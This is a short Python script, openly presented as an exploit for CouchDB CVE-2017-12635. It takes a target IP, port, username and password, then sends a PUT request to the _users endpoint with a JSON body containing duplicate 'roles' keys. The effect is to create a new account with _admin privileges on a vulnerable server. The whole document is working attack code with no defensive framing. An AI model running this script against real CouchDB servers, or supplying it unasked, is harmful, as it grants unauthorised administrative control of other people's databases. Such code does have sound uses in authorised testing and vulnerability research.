import requests
import argparse

# input
parser = argparse.ArgumentParser(
    description="Exploit CouchDB CVE-2017-12635 to create user with admin privileges.",
    usage="python script.py <ip> <port> <username> <password>"
)
parser.add_argument("ip", help="Target IP address")
parser.add_argument("port", help="Target port number")
parser.add_argument("username", help="Username to create")
parser.add_argument("password", help="Password for the user")
args = parser.parse_args()

# URL and JSON
url = f"http://{args.ip}:{args.port}/_users/org.couchdb.user:{args.username}"
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json"
}

# Construct a JSON payload with duplicate "roles" using a string.
payload = f'''{{
  "type": "user",
  "name": "{args.username}",
  "roles": ["_admin"],
  "roles": [],
  "password": "{args.password}"
}}'''

# Send a PUT request.
try:
    response = requests.put(url, headers=headers, data=payload)

    # check
    if response.status_code == 201 and response.json().get("ok"):
        print(f"[+] User '{args.username}' created successfully with admin privileges.")
    elif response.status_code == 409:
        print(f"[-] User '{args.username}' already exists. Try a different username.")
    else:
        print(f"[!] Failed to create user. Status Code: {response.status_code}")
        if response.headers.get("Content-Type") == "application/json":
            print("Error:", response.json().get("error"), "-", response.json().get("reason"))
except requests.RequestException as e:
    print("[!] Error connecting to CouchDB:", e)
